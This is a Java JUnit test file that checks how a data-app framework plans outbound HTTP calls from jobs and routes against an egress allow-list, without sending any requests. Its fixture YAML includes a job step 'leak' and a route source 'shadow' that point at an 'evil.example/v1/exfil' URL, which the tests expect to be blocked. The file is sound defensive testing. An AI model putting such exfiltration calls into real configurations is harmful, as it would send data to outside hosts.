package io.tesseraql.test;

import static org.assertj.core.api.Assertions.assertThat;

import io.tesseraql.test.TestSuite.Expectation;
import io.tesseraql.test.TestSuite.HttpCallTarget;
import io.tesseraql.test.TestSuite.TestCase;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * Phase 26: an http-call case plans a job's {@code http-call:} steps against the case's params —
 * URL placeholders and query bindings resolve exactly as at runtime, and the egress allow-list is
 * applied — without issuing a network request. The planned requests are the case's rows.
 */
class HttpCallCaseTest {

    @TempDir
    static Path appHome;

    static TestRunner runner;

    @BeforeAll
    static void setUp() throws Exception {
        Files.createDirectories(appHome.resolve("config"));
        Files.writeString(appHome.resolve("config/tesseraql.yml"), """
                tesseraql:
                  app:
                    name: orders
                  http:
                    outbound:
                      allowedHosts:
                        - api.partner.example
                        - "*.internal.example"
                      credentials:
                        partner:
                          type: bearer
                          token: ${secret.env.PARTNER_TOKEN}
                """);
        Files.createDirectories(appHome.resolve("batch/sync"));
        Files.writeString(appHome.resolve("batch/sync/job.yml"), """
                version: tesseraql/v1
                id: orders.sync
                kind: job
                recipe: batch-pipeline
                pipeline:
                  - id: fetch
                    http-call:
                      method: GET
                      url: https://api.partner.example/v1/rates
                      query:
                        on: job.businessDate
                  - id: push
                    http-call:
                      method: POST
                      url: https://eu.internal.example/v1/orders
                      credential: partner
                  - id: leak
                    http-call:
                      url: https://evil.example/v1/exfil
                """);
        // A query route with http: sources (docs/connectors.md) — planned by route target.
        Files.createDirectories(appHome.resolve("web/orders"));
        Files.writeString(appHome.resolve("web/orders/orders.sql"), "select 1 as id\n");
        Files.writeString(appHome.resolve("web/orders/get.yml"), """
                version: tesseraql/v1
                id: orders.list
                kind: route
                recipe: query-json
                sql:
                  file: orders.sql
                http:
                  rates:
                    url: https://api.partner.example/v1/rates
                    credential: partner
                  shadow:
                    url: https://evil.example/v1/exfil
                response:
                  json:
                    status: 200
                    body:
                      rows: sql.rows
                """);
        runner = new TestRunner(null, appHome);
    }

    private static TestReport run(TestCase test) {
        return runner.run(new TestSuite(List.of(test)));
    }

    @Test
    void plansEveryHttpStepResolvingQueryAndAllowList() {
        TestReport report = run(new TestCase("plans all", null, null,
                Map.of("job", Map.of("businessDate", "2026-06-14")),
                new Expectation(3, List.of(
                        Map.of("http", "fetch", "method", "GET",
                                "url", "https://api.partner.example/v1/rates?on=2026-06-14",
                                "host", "api.partner.example", "allowed", true),
                        Map.of("http", "push", "method", "POST",
                                "host", "eu.internal.example", "allowed", true,
                                "credential", "partner"),
                        Map.of("http", "leak", "host", "evil.example", "allowed", false))),
                null, null, null, new HttpCallTarget("orders.sync", null)));

        assertThat(report.results()).singleElement()
                .satisfies(result -> assertThat(result.passed())
                        .withFailMessage(result.message()).isTrue());
    }

    @Test
    void plansASingleTargetedStep() {
        TestReport report = run(new TestCase("plan one", null, null, Map.of(),
                new Expectation(1, List.of(Map.of("http", "leak", "allowed", false))),
                null, null, null, new HttpCallTarget("orders.sync", "leak")));

        assertThat(report.results()).singleElement()
                .satisfies(result -> assertThat(result.passed())
                        .withFailMessage(result.message()).isTrue());
    }

    @Test
    void anUnknownJobFailsTheCase() {
        TestReport unknownJob = run(new TestCase("unknown", null, null, Map.of(), null,
                null, null, null, new HttpCallTarget("orders.unknown", null)));

        assertThat(unknownJob.results().get(0).passed()).isFalse();
    }

    /** A route target plans the route's http: sources with the same row shape as job steps. */
    @Test
    void plansARoutesHttpSourcesWithTheAllowListVerdict() {
        TestReport report = run(new TestCase("route sources", null, null, Map.of(),
                new Expectation(2, List.of(
                        Map.of("http", "rates", "method", "GET", "allowed", true,
                                "credential", "partner"),
                        Map.of("http", "shadow", "allowed", false))),
                null, null, null, new HttpCallTarget(null, null, "orders.list")));
        assertThat(report.allPassed()).as(report.results().toString()).isTrue();
    }

    /** Exactly one of job/route: both or neither fails with a clear message. */
    @Test
    void aTargetNeedsExactlyOneOfJobOrRoute() {
        TestReport neither = run(new TestCase("neither", null, null, Map.of(), null,
                null, null, null, new HttpCallTarget(null, null, null)));
        assertThat(neither.results().get(0).message())
                .contains("exactly one of http-call.job or http-call.route");
    }
}
